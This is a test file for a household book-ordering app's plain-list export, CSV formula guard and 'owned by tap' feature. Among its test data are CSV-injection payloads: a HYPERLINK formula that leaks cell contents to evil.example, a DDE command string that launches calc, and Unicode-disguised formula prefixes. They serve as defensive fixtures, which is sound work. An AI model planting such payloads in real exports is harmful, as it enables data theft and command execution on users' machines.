// No-shop mode (philobiblos#27 slice 5): the month's order as a plain list (mail text, a printable page, a CSV) for any
// shop or none, and its books marked owned by a tap (and the tap undone). Every book, name and number is invented. Each
// rule has a test that fails when the rule is changed; the CSV's formula guard is philobiblos#45's.
import { and, eq } from 'drizzle-orm';
import { afterAll, beforeEach, describe, expect, it } from 'vitest';
import { buildApp, type BuiltApp } from '../src/app';
import { loadConfig } from '../src/config';
import * as t from '../src/db/schema';
import { seal } from '../src/household/sealed';
import { parseCsv } from '../src/orders/csv';
import { TAP_INVOICE_DAYS } from '../src/mail/effects';
import { recordEntry } from '../src/orders/entries';
import { LIST_COLUMNS, csvCell, listCsv, unguardCell } from '../src/orders/list';
import { ORIGIN, TEST_SEALING_KEY, THIS_MONTH, household, sessionCookie } from './helpers';

const HOSTILE = ['\u0007=1+1', '\tcmd', '\rcmd', '=HYPERLINK("https://evil.example/?x="&A1,"Open")', '+1+1', '-2+3', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '  =1+1', '＝1+1', '＋1', '－1', '＠SUM(A1)',
  // philobiblos#47 item 3: an invisible character first, and the small and other compatibility forms of = + - @ (NFKC).
  '\u200b=1+1', '\u2060@SUM(A1)', '\ufeff+1', '\u200d-1', '\u00a0=1', '﹢1', '﹦1', '﹣1', '﹫x', '⁺1', '₌1'];

describe('the CSV formula guard (philobiblos#45; OWASP CSV injection)', () => {
  it.each(HOSTILE)('a cell starting %j is written as text (a leading quote), quoted', (v) => {
    const cell = csvCell(v);
    expect(cell.startsWith('"\''), cell).toBe(true);
    expect(cell.endsWith('"')).toBe(true);
    // Read back by a spreadsheet's CSV reader, the cell starts with the quote: never = + - @.
    const [[read]] = parseCsv(cell) as [[string]];
    expect(read.startsWith('\'')).toBe(true);
  });

  it('ordinary text is only quoted; a quote inside is written twice; one row stays one line', () => {
    expect(csvCell('The Quiet Hedgehog')).toBe('"The Quiet Hedgehog"');
    expect(csvCell('Value "Beyond" Price')).toBe('"Value ""Beyond"" Price"');
    expect(csvCell('Two\nlines\r\nhere')).toBe('"Two lines  here"');
    expect(csvCell('A - B = C')).toBe('"A - B = C"'); // a formula character later in the cell is text
    expect(csvCell('')).toBe('""');
  });

  it('a cell that starts with an apostrophe gets one more, which the import leaves out (philobiblos#47 item 2)', () => {
    expect(csvCell('\'s-Hertogenbosch, a history')).toBe('"\'\'s-Hertogenbosch, a history"');
    expect(csvCell('\'=x')).toBe('"\'\'=x"');
    for (const v of ['\'=x', '\' Tis the season', '\'s-Hertogenbosch', '\'', '\'\'twice', '\'\t=1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!), JSON.stringify(v)).toBe(v.replace(/\t/g, ' '));
  });

  it('the importer reads a guarded cell back as it was; any other apostrophe stays', () => {
    for (const v of ['=1+1', '+1', '-2+3', '@SUM(A1)', '  =1', '\u200b=1', '﹢1', '\u00a0=1', '⁺1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!), JSON.stringify(v)).toBe(v);
    expect(unguardCell('\'s-Hertogenbosch')).toBe('\'s-Hertogenbosch');
    expect(unguardCell('\'Tis the season')).toBe('\'Tis the season');
  });

  it('the list: a byte order mark, the importer\'s columns, CRLF, an ISBN a spreadsheet keeps as text, the estimate', () => {
    const csv = listCsv([
      { title: '=cmd|\' /C calc\'!A0', authors: ['@Mira Okafor', 'Second Author'], isbn13: '9780000000002', estimateC: 1890 },
      { title: 'Value Beyond Price', authors: [], isbn13: null, estimateC: null },
    ]);
    expect(csv.startsWith('﻿isbn,title,author,qty,price,estimate\r\n')).toBe(true);
    expect(LIST_COLUMNS).toEqual(['isbn', 'title', 'author', 'qty', 'price', 'estimate']);
    expect(csv.split('\r\n')).toEqual([
      '﻿isbn,title,author,qty,price,estimate',
      '"978-0000000002","\'=cmd|\' /C calc\'!A0","\'@Mira Okafor","1","","18.90"',
      '"","Value Beyond Price","","1","",""',
      '',
    ]);
    // Every cell, read by a spreadsheet, starts with no formula character.
    for (const row of parseCsv(csv)) for (const c of row) expect(c, c).not.toMatch(/^\s*[=+\-@＝＋－＠]/);
  });
});

// ------------------------------------------------------------------------------------------------- the routes

const KID_NAME = 'Juniper Example';
let built: BuiltApp;
let db: ReturnType<typeof household>;
let alex: string;
let sam: string;
const iso = '2026-11-16T10:00:00.000Z';

/** helpers.ts's household with three books picked this month (one with a hostile title), the order kept (picked). */
async function world(opts: { bookshop?: boolean } = {}) {
  db = household();
  db.update(t.person).set({ name: KID_NAME }).where(eq(t.person.id, 'p_kid1')).run();
  db.update(t.book).set({ isbn13: '9780000000002' }).where(eq(t.book.id, 'b_tide')).run();
  db.insert(t.book).values([
    { id: 'b_hedgehog', title: 'The Quiet Hedgehog', authorsJson: '["Lena Paulsen"]', isbn13: '9780000000019', audience: 'kids', normKey: 'x', createdAt: iso },
    { id: 'b_formula', title: '=HYPERLINK("https://evil.example","Open")', authorsJson: '["+Mira Okafor"]', audience: 'adult', normKey: 'y', createdAt: iso },
  ]).run();
  db.insert(t.order).values({ id: 'o_now', month: THIS_MONTH, status: 'picked', createdAt: iso }).run();
  db.insert(t.orderLine).values([
    { orderId: 'o_now', bookId: 'b_tide', forPerson: 'p_alex', estimateC: 1890 },
    { orderId: 'o_now', bookId: 'b_hedgehog', forPerson: 'p_kid1', estimateC: 2500 },
    { orderId: 'o_now', bookId: 'b_formula', forPerson: 'p_sam', estimateC: 2500 },
  ]).run();
  const key = Buffer.from(TEST_SEALING_KEY, 'base64');
  seal(db, key, 'delivery_address', 'Alex Example\nExample Street 1\n8000 Exampleton');
  if (opts.bookshop) seal(db, key, 'bookshop_email', 'orders@bookshop.example');
  alex = sessionCookie(db, 'p_alex');
  sam = sessionCookie(db, 'p_sam');
  built = await buildApp(loadConfig({ PHILOBIBLOS_MODE: 'standalone', PHILOBIBLOS_DATA_DIR: '/nonexistent', PHILOBIBLOS_SEALING_KEY: TEST_SEALING_KEY }), db);
  await built.app.ready();
}
afterAll(() => built?.app.close());

const get = (url: string, cookie = alex) => built.app.inject({ url, headers: { cookie } });
const send = (method: 'POST' | 'PUT', url: string, payload: unknown, cookie = alex) =>
  built.app.inject({ method, url, payload: JSON.stringify(payload), headers: { cookie, origin: ORIGIN, 'content-type': 'application/json' } });
const line = (bookId: string) => db.select().from(t.orderLine).where(eq(t.orderLine.bookId, bookId)).get()!;
const copiesOf = (bookId: string) => db.select().from(t.copy).where(eq(t.copy.bookId, bookId)).all();
/** A tap; the copy it made dated `iso`, the invoices' date here, so the tests do not depend on the day they run. */
const tap = async (bookId: string, owned: unknown, cookie = alex) => {
  const r = await send('PUT', `/api/orders/o_now/lines/${bookId}`, { owned }, cookie);
  db.update(t.copy).set({ acquiredAt: iso }).where(eq(t.copy.source, 'manual')).run();
  return r;
};
const makeList = async () => { const r = await send('POST', '/api/orders', { month: THIS_MONTH, list: true }); expect(r.statusCode, r.body).toBe(201); return r.json(); };

describe('the order as a plain list (POST /orders, list: true)', () => {
  beforeEach(async () => { await built?.app.close(); await world(); });

  it('needs no bookshop address: the order is composed, the mail text to no one, no delivery address, no card line', async () => {
    db.delete(t.connectorEnabled).run(); // no connector naming an order address either
    expect((await send('POST', '/api/orders', { month: THIS_MONTH })).statusCode).toBe(409); // Compose still needs one
    const o = await makeList();
    expect(o.status).toBe('drafted');
    expect(o.composeUrl).toBeUndefined();
    expect(o.composeTo).toBeUndefined();
    expect(o.listSubject).toMatch(/^Book order, /);
    expect(o.listUrl.startsWith(`mailto:?subject=${encodeURIComponent(o.listSubject)}&body=`)).toBe(true);
    expect(o.listComplete).toBe(true);
    expect(o.listText).toContain('The Quiet Hedgehog');
    expect(o.listText).toContain('ISBN 9780000000002');
    expect(o.listText).not.toContain('Example Street');
    expect(decodeURIComponent(o.listUrl)).not.toContain('Example Street');
    expect(o.listText).not.toContain(KID_NAME);
    expect(o.listText).not.toContain('Alex'); // not signed either: the person signs in their own mail app
    expect(o.listText).not.toMatch(/card number|cvc|cvv/i);
    // the printable page's rows: each book with its ISBN and estimate
    expect(o.lines.find((l: { book: { id: string } }) => l.book.id === 'b_tide')).toMatchObject({ book: { isbn13: '9780000000002' }, estimate: 1890, state: 'planned', ownedByTap: false });
  });

  it('works with a bookshop address set too, and without a usable sealing key (nothing sealed is opened)', async () => {
    await built.app.close();
    await world({ bookshop: true });
    const o = await makeList();
    expect(o.composeTo).toBeUndefined();
    expect(o.listUrl.startsWith('mailto:?')).toBe(true);
    await built.app.close();
    built = await buildApp(loadConfig({ PHILOBIBLOS_MODE: 'standalone', PHILOBIBLOS_DATA_DIR: '/nonexistent' }), db); // no key
    await built.app.ready();
    expect((await send('POST', '/api/orders', { month: THIS_MONTH })).statusCode).toBe(409);
    expect((await send('POST', '/api/orders', { month: THIS_MONTH, list: true })).statusCode).toBe(201);
  });

  it('list must be true or false; nothing else in the body', async () => {
    for (const body of [{ month: THIS_MONTH, list: 'yes' }, { month: THIS_MONTH, list: 1 }, { month: THIS_MONTH, list: null }, { month: THIS_MONTH, to: 'x@y.example' }]) {
      const r = await send('POST', '/api/orders', body);
      expect(r.statusCode, JSON.stringify(body)).toBe(400);
    }
    expect(db.select().from(t.order).where(eq(t.order.id, 'o_now')).get()!.status).toBe('picked');
  });

  it('nothing picked: 409', async () => {
    db.delete(t.orderLine).run();
    expect((await send('POST', '/api/orders', { month: THIS_MONTH, list: true })).statusCode).toBe(409);
  });
});

describe('the list read again once composed (a reload, a tap)', () => {
  beforeEach(async () => { await built?.app.close(); await world(); });
  it('the books still to buy, and nothing changes: the order as it was', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    const before = JSON.stringify([db.select().from(t.order).all(), db.select().from(t.orderLine).all(), db.select().from(t.copy).all()]);
    const o = await makeList();
    expect(o.status).toBe('drafted');
    expect(o.listText).not.toContain('The Long Tide of Markets');
    expect(o.listText).toContain('The Quiet Hedgehog');
    expect(o.lines.find((l: { book: { id: string } }) => l.book.id === 'b_tide')).toMatchObject({ state: 'delivered', ownedByTap: true });
    expect(JSON.stringify([db.select().from(t.order).all(), db.select().from(t.orderLine).all(), db.select().from(t.copy).all()])).toBe(before);
  });
  it('a quoted order\'s list too (the shop has the mail, the list is for buying elsewhere)', async () => {
    await makeList();
    db.update(t.order).set({ status: 'quoted' }).where(eq(t.order.id, 'o_now')).run();
    expect((await send('POST', '/api/orders', { month: THIS_MONTH, list: true })).statusCode).toBe(201);
    expect((await send('POST', '/api/orders', { month: THIS_MONTH })).statusCode).toBe(409);
  });
});

describe('the list as a CSV (GET /orders/{id}/list.csv)', () => {
  beforeEach(async () => { await built?.app.close(); await world(); });

  it('only once the list is made (a picked order may still change): 409; no such order: 404', async () => {
    expect((await get('/api/orders/o_now/list.csv')).statusCode).toBe(409);
    expect((await get('/api/orders/o_nope/list.csv')).statusCode).toBe(404);
  });

  it('an attachment of text/csv, not kept by caches; the books still to buy, guarded, no one\'s name', async () => {
    await makeList();
    expect((await tap('b_hedgehog', true)).statusCode).toBe(200);
    const r = await get('/api/orders/o_now/list.csv', sam);
    expect(r.statusCode, r.body).toBe(200);
    expect(r.headers['content-type']).toBe('text/csv; charset=utf-8');
    expect(r.headers['content-disposition']).toBe(`attachment; filename="book-order-${THIS_MONTH}.csv"`);
    expect(r.headers['cache-control']).toBe('no-store');
    expect(r.headers['x-content-type-options']).toBe('nosniff');
    const rows = parseCsv(r.body);
    expect(rows[0]).toEqual(['isbn', 'title', 'author', 'qty', 'price', 'estimate']);
    expect(rows.slice(1).map((x) => x[1]).sort()).toEqual(['\'=HYPERLINK("https://evil.example","Open")', 'The Long Tide of Markets'].sort());
    expect(rows.find((x) => x[1]!.includes('HYPERLINK'))![2]).toBe('\'+Mira Okafor');
    for (const row of rows) for (const c of row) expect(c).not.toMatch(/^\s*[=+\-@]/);
    expect(r.body).not.toContain(KID_NAME);
    expect(r.body).not.toContain('Alex');
    expect(r.body).not.toContain('Example Street');
  });

  it('round trip: the same file, the prices paid filled in, imports as the invoice of the same books', async () => {
    await makeList();
    const csv = (await get('/api/orders/o_now/list.csv')).body.replace(/"1",""/g, '"1","12.50"');
    const r = recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', csv, dryRun: true }, new Date(iso));
    expect(r.ignoredColumns).toEqual(['estimate']);
    expect(r.lines.map((l) => [l.bookId, l.new, l.title]).sort()).toEqual([
      ['b_formula', false, '=HYPERLINK("https://evil.example","Open")'],
      ['b_hedgehog', false, 'The Quiet Hedgehog'],
      ['b_tide', false, 'The Long Tide of Markets'],
    ]);
  });
});

describe('a guarded cell imported (orders/entries.ts reads the guard back)', () => {
  it('a title that starts with an apostrophe, exported and imported with no ISBN, keeps it (philobiblos#47 item 2)', () => {
    const d = household();
    const rows = ['\' Tis the Season of Quiet Things', '\'=Not a Formula', '\'s-Hertogenbosch Days'].map((title) => ({ title, authors: ['Lena Paulsen'], isbn13: null, estimateC: null }));
    const csv = listCsv(rows).replaceAll(',"1","",""\r\n', ',"1","12.00",""\r\n');
    const r = recordEntry(d, 'p_alex', { kind: 'invoice', shop: 'Corner Books', csv, dryRun: true }, new Date(iso));
    expect(r.lines.map((l) => [l.new, l.title])).toEqual(rows.map((b) => [true, b.title]));
  });

  it('a new book from a guarded cell keeps its own title, without the quote the guard wrote', () => {
    const d = household();
    const csv = `title,author,qty,price\r\n${csvCell('=Sums of the Commons')},${csvCell('-Ada Example')},1,9.00\r\n${csvCell('\'s-Hertogenbosch Days')},,1,9.00\r\n`;
    const r = recordEntry(d, 'p_alex', { kind: 'invoice', shop: 'Corner Books', csv, dryRun: true }, new Date(iso));
    expect(r.lines.map((l) => [l.new, l.title, l.authors])).toEqual([[true, '=Sums of the Commons', ['-Ada Example']], [true, '\'s-Hertogenbosch Days', []]]);
  });
});

describe('a copy marked owned by a tap (PUT /orders/{id}/lines/{bookId})', () => {
  beforeEach(async () => { await built?.app.close(); await world(); });

  it('only once the list or the mail is made: a picked order is 409; no such order or line is 404', async () => {
    expect((await tap('b_tide', true)).statusCode).toBe(409);
    await makeList();
    expect((await send('PUT', '/api/orders/o_nope/lines/b_tide', { owned: true })).statusCode).toBe(404);
    expect((await tap('b_nope', true)).statusCode).toBe(404);
    expect(copiesOf('b_tide')).toHaveLength(0);
  });

  it('owned: one copy (manual, of this order, no price paid), the line delivered; a second tap changes nothing (409)', async () => {
    await makeList();
    const r = await tap('b_formula', true, sam); // any adult: the household's order and copies are shared
    expect(r.statusCode, r.body).toBe(200);
    expect(r.json().lines.find((l: { book: { id: string } }) => l.book.id === 'b_formula')).toMatchObject({ state: 'delivered', ownedByTap: true });
    expect(copiesOf('b_formula').map((c) => [c.source, c.orderId, c.priceC])).toEqual([['manual', 'o_now', null]]);
    expect(line('b_formula').state).toBe('delivered');
    expect(db.select().from(t.bookOffer).where(eq(t.bookOffer.bookId, 'b_formula')).all()).toEqual([]); // nothing learnt
    expect((await tap('b_formula', true)).statusCode).toBe(409);
    expect(copiesOf('b_formula')).toHaveLength(1);
  });

  it('a quoted line\'s copy is priced as the shop quoted it', async () => {
    await makeList();
    db.update(t.orderLine).set({ state: 'quoted', quotedC: 1750 }).where(eq(t.orderLine.bookId, 'b_tide')).run();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    expect(copiesOf('b_tide').map((c) => c.priceC)).toEqual([1750]);
    expect((await tap('b_tide', false)).statusCode).toBe(200);
    expect(line('b_tide')).toMatchObject({ state: 'quoted', quotedC: 1750, copyId: null });
  });

  it('an unavailable line, or one an invoice delivered, is not tapped; that invoice\'s copy is never undone here', async () => {
    await makeList();
    db.update(t.orderLine).set({ state: 'unavailable' }).where(eq(t.orderLine.bookId, 'b_hedgehog')).run();
    expect((await tap('b_hedgehog', true)).statusCode).toBe(409);
    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500 }] }, new Date(iso));
    expect(line('b_tide').state).toBe('delivered');
    expect((await tap('b_tide', true)).statusCode).toBe(409);
    expect((await tap('b_tide', false)).statusCode).toBe(409);
    expect(copiesOf('b_tide')).toHaveLength(1);
    // A second invoice of the book is a second copy bought: of no order (the line was the first invoice's), the total as it was.
    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1400 }] }, new Date(iso));
    expect(copiesOf('b_tide').map((c) => [c.orderId, c.priceC]).sort()).toEqual([['o_now', 1500], [null, 1400]].sort());
    expect(db.select().from(t.order).where(eq(t.order.id, 'o_now')).get()!.invoicedC).toBe(1500);
  });

  it('a tap, then the invoice typed in: the invoice takes the tap\'s copy (one copy, its price paid), the order invoiced, no undo (philobiblos#47)', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    const tapped = line('b_tide').copyId!;
    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500 }] }, new Date(iso));
    expect(copiesOf('b_tide').map((c) => [c.id, c.source, c.orderId, c.priceC])).toEqual([[tapped, 'manual', 'o_now', 1500]]);
    expect(line('b_tide')).toMatchObject({ state: 'delivered', copyId: null, tappedFrom: null });
    expect(db.select().from(t.order).where(eq(t.order.id, 'o_now')).get()).toMatchObject({ status: 'invoiced', invoicedC: 1500 });
    expect(db.select().from(t.bookOffer).where(eq(t.bookOffer.bookId, 'b_tide')).all().map((o) => o.priceC)).toEqual([1500]);
    const r = await get('/api/orders/o_now');
    expect(r.json().lines.find((l: { book: { id: string } }) => l.book.id === 'b_tide')).toMatchObject({ state: 'delivered', ownedByTap: false });
    expect((await tap('b_tide', false)).statusCode).toBe(409); // the invoice's copy now: never undone here
    expect(copiesOf('b_tide')).toHaveLength(1);
  });

  it('a tap, then an invoice of two copies: the tap\'s copy and one more, both at the price paid', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    const tapped = line('b_tide').copyId!;
    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500, qty: 2 }] }, new Date(iso));
    const copies = copiesOf('b_tide');
    expect(copies.map((c) => [c.orderId, c.priceC])).toEqual([['o_now', 1500], ['o_now', 1500]]);
    expect(copies.map((c) => c.id)).toContain(tapped);
  });

  it('a tap long before an invoice of the book is another purchase: the invoice makes its own copy, the tap stays (philobiblos#47)', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    const later = new Date(Date.parse(iso) + (TAP_INVOICE_DAYS + 1) * 86_400_000);
    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', date: later.toISOString().slice(0, 10), lines: [{ isbn: '9780000000002', price: 1500 }] }, later);
    expect(copiesOf('b_tide').map((c) => [c.source, c.orderId, c.priceC]).sort()).toEqual([['manual', null, 1500], ['manual', 'o_now', null]]);
    expect(line('b_tide').copyId).not.toBeNull(); // still the tap's, still undoable
  });

  it('a book tapped in one order and still to buy in a later one: the invoice delivers the later line, the tap stays', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    db.insert(t.order).values({ id: 'o_next', month: '2099-01', status: 'drafted', createdAt: iso }).run();
    db.insert(t.orderLine).values({ orderId: 'o_next', bookId: 'b_tide', forPerson: 'p_sam', estimateC: 1890 }).run();
    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500 }] }, new Date(iso));
    expect(copiesOf('b_tide').map((c) => c.orderId).sort()).toEqual(['o_next', 'o_now']);
    expect(db.select().from(t.orderLine).where(and(eq(t.orderLine.orderId, 'o_now'), eq(t.orderLine.bookId, 'b_tide'))).get()!.copyId).not.toBeNull();
  });

  it('a quote after a tap leaves the bought line as it is (delivered, still undoable)', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    recordEntry(db, 'p_alex', { kind: 'quote', month: THIS_MONTH, lines: [{ isbn: '9780000000002', price: 1600 }, { title: 'The Quiet Hedgehog', available: false }] }, new Date(iso));
    expect(line('b_tide')).toMatchObject({ state: 'delivered', quotedC: null });
    expect(line('b_tide').copyId).not.toBeNull();
    expect(line('b_hedgehog').state).toBe('unavailable');
    expect((await tap('b_tide', false)).statusCode).toBe(200);
    expect(copiesOf('b_tide')).toHaveLength(0);
  });

  it('undo puts back the state the tap found, a quote without a price too; ownedByTap only while delivered', async () => {
    await makeList();
    db.update(t.orderLine).set({ state: 'quoted', quotedC: null }).where(eq(t.orderLine.bookId, 'b_tide')).run();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    expect((await tap('b_tide', false)).statusCode).toBe(200);
    expect(line('b_tide').state).toBe('quoted');
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    db.update(t.orderLine).set({ state: 'quoted' }).where(eq(t.orderLine.bookId, 'b_tide')).run(); // state and copy disagree
    const r = await get('/api/orders/o_now');
    expect(r.json().lines.find((l: { book: { id: string } }) => l.book.id === 'b_tide').ownedByTap).toBe(false);
  });

  it('undo: the tap\'s copy removed, the line planned again; twice is 409', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    const r = await tap('b_tide', false);
    expect(r.statusCode, r.body).toBe(200);
    expect(copiesOf('b_tide')).toHaveLength(0);
    expect(line('b_tide')).toMatchObject({ state: 'planned', copyId: null });
    expect((await tap('b_tide', false)).statusCode).toBe(409);
    expect((await tap('b_tide', true)).statusCode).toBe(200); // and again
    expect(copiesOf('b_tide')).toHaveLength(1);
  });

  it('once a book is in the library, the picks are fixed (Pick again would lose it): 409 until it is undone', async () => {
    await makeList();
    expect((await tap('b_tide', true)).statusCode).toBe(200);
    expect((await send('POST', `/api/month/${THIS_MONTH}/picks`, { recompute: true })).statusCode).toBe(409);
    expect((await send('POST', '/api/orders', { month: THIS_MONTH })).statusCode).toBe(409);
    expect((await send('PUT', `/api/month/${THIS_MONTH}/budget`, null)).statusCode).toBe(409);
    expect((await tap('b_tide', false)).statusCode).toBe(200);
    expect((await send('POST', '/api/orders', { month: THIS_MONTH, list: true })).statusCode).toBe(201);
  });

  it('owned must be true or false, and nothing else', async () => {
    await makeList();
    for (const body of [{ owned: 'yes' }, {}, { owned: true, price: 100 }, null]) {
      expect((await send('PUT', '/api/orders/o_now/lines/b_tide', body)).statusCode, JSON.stringify(body)).toBe(400);
    }
    expect(copiesOf('b_tide')).toHaveLength(0);
  });

  it('a kid cannot tap (kids reach no route)', async () => {
    await makeList();
    expect((await tap('b_hedgehog', true, sessionCookie(db, 'p_kid1'))).statusCode).toBe(403);
    expect(copiesOf('b_hedgehog')).toHaveLength(0);
  });
});
